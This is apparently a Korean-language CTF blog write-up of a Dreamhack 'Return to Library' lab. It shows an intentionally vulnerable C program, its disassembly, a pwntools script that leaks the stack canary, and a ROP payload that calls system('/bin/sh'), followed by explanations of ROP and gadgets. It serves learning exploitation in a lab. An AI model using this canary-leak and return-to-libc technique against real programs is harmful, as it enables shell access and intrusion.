---
layout: posts
title: "Return to Library"
categories: ["CTF"]
---

## 문제

**Exploit Tech: Return to Library에서 실습하는 문제입니다.**

```c
┌──(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0415]
└─$ cat rtl.c
// Name: rtl.c
// Compile: gcc -o rtl rtl.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

const char* binsh = "/bin/sh";

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Add system function to plt's entry
  system("echo 'system@plt'");

  // Leak canary
  printf("[1] Leak Canary\n");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Overwrite return address
  printf("[2] Overwrite return address\n");
  printf("Buf: ");
  read(0, buf, 0x100);

  return 0;
}
```

## 해결

```bash
gef➤  checksec
[+] checksec for '/home/hyeoni/Documents/Dreamhack/0415/rtl'
Canary                        : ✓
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```

```nasm
gef➤  disassemble main
Dump of assembler code for function main:
   0x00000000004006f7 <+0>:     push   rbp
   0x00000000004006f8 <+1>:     mov    rbp,rsp
   0x00000000004006fb <+4>:     sub    rsp,0x40
   0x00000000004006ff <+8>:     mov    rax,QWORD PTR fs:0x28
   0x0000000000400708 <+17>:    mov    QWORD PTR [rbp-0x8],rax
   0x000000000040070c <+21>:    xor    eax,eax
   0x000000000040070e <+23>:    mov    rax,QWORD PTR [rip+0x20095b]        # 0x601070 <stdin@@GLIBC_2.2.5>
   0x0000000000400715 <+30>:    mov    ecx,0x0
   0x000000000040071a <+35>:    mov    edx,0x2
   0x000000000040071f <+40>:    mov    esi,0x0
   0x0000000000400724 <+45>:    mov    rdi,rax
   0x0000000000400727 <+48>:    call   0x400600 <setvbuf@plt>
   0x000000000040072c <+53>:    mov    rax,QWORD PTR [rip+0x20092d]        # 0x601060 <stdout@@GLIBC_2.2.5>
   0x0000000000400733 <+60>:    mov    ecx,0x0
   0x0000000000400738 <+65>:    mov    edx,0x2
   0x000000000040073d <+70>:    mov    esi,0x0
   0x0000000000400742 <+75>:    mov    rdi,rax
   0x0000000000400745 <+78>:    call   0x400600 <setvbuf@plt>
   0x000000000040074a <+83>:    mov    edi,0x40087c
   0x000000000040074f <+88>:    mov    eax,0x0
   0x0000000000400754 <+93>:    call   0x4005d0 <system@plt>
   0x0000000000400759 <+98>:    mov    edi,0x40088e
   0x000000000040075e <+103>:   call   0x4005b0 <puts@plt>
   0x0000000000400763 <+108>:   mov    edi,0x40089e
   0x0000000000400768 <+113>:   mov    eax,0x0
   0x000000000040076d <+118>:   call   0x4005e0 <printf@plt>
   0x0000000000400772 <+123>:   lea    rax,[rbp-0x40]
   0x0000000000400776 <+127>:   mov    edx,0x100
   0x000000000040077b <+132>:   mov    rsi,rax
   0x000000000040077e <+135>:   mov    edi,0x0
   0x0000000000400783 <+140>:   call   0x4005f0 <read@plt>
   0x0000000000400788 <+145>:   lea    rax,[rbp-0x40]
   0x000000000040078c <+149>:   mov    rsi,rax
   0x000000000040078f <+152>:   mov    edi,0x4008a4
   0x0000000000400794 <+157>:   mov    eax,0x0
   0x0000000000400799 <+162>:   call   0x4005e0 <printf@plt>
   0x000000000040079e <+167>:   mov    edi,0x4008ad
   0x00000000004007a3 <+172>:   call   0x4005b0 <puts@plt>
   0x00000000004007a8 <+177>:   mov    edi,0x40089e
   0x00000000004007ad <+182>:   mov    eax,0x0
   0x00000000004007b2 <+187>:   call   0x4005e0 <printf@plt>
   0x00000000004007b7 <+192>:   lea    rax,[rbp-0x40]
   0x00000000004007bb <+196>:   mov    edx,0x100
   0x00000000004007c0 <+201>:   mov    rsi,rax
   0x00000000004007c3 <+204>:   mov    edi,0x0
   0x00000000004007c8 <+209>:   call   0x4005f0 <read@plt>
   0x00000000004007cd <+214>:   mov    eax,0x0
   0x00000000004007d2 <+219>:   mov    rcx,QWORD PTR [rbp-0x8]
   0x00000000004007d6 <+223>:   xor    rcx,QWORD PTR fs:0x28
   0x00000000004007df <+232>:   je     0x4007e6 <main+239>
   0x00000000004007e1 <+234>:   call   0x4005c0 <__stack_chk_fail@plt>
   0x00000000004007e6 <+239>:   leave
   0x00000000004007e7 <+240>:   ret
End of assembler dump.
```

```python
┌──(venv)(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0415]
└─$ cat ./exploit.py
from pwn import *

s = process("./rtl")

payload = b"A" * 57

s.sendafter(b"Buf: ", payload)
s.recvuntil(payload)
leaked_byte = s.recv(7)
canary = u64(b"\x00" + leaked_byte)

print(f"[+] Leaked Canary: {hex(canary)}")

s.interactive()
```

→canary 알아내기.

```python
rop = ROP(e)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
system_plt = e.plt['system']

payload2 = b"A" * 56
payload2 += p64(canary)
payload2 += b"B" * 8
payload2 += p64(ret)
payload2 += p64(pop_rdi)
payload2 += p64(binsh_addr)
payload2 += p64(system_plt)
```

32-bit 의 경우 payload 에 dummy, canary 등을 다 연결하면 되었었지만, 64-bit 의 경우에는 함수의 첫 번째 인자를 `rdi` 레지스터를 통해 전달해야한다.

### ROP (Return-Oriented Programming)

과거에는 쉘 코드를 직접 넣어놓고 실행시키는 buffer overflow 공격이 많았음 → NX(No-Execute) 보호 기법이 등장하면서 스택에 있는 데이터를 코드로 시행할 수 없게 되었음.

→ ROP 등장.

새로운 코드를 주입할 수 없다면, 이미 메모리에 실행 권한을 가지고 올라가 있는 정상적인 코드 조각들을 모아서 내가 원하는 동작을 조립하자

### Gadget

gadget 은 프로그램 내부에 존재하는 아주 짧은 명령어의 연속이다. 모든 gadget 은 반드시 ret 명령어로 끝난다.

예) pop rdi; ret

**`ret`**

ret = pop rip

즉, 스택의 맨 위(RSP)에 있는 값을 꺼내서, 다음에 실행할 명령어 주소 레지스터(RIP)에 집어넣어라 라는 뜻.

gadget이 `ret`으로 끝나기 때문에, 하나의 가젯 실행이 끝나면 자연스럽게 스택에 적혀있는 다음 가젯의 주소를 꺼내서 연쇄적으로 실행할 수 있게 된다.
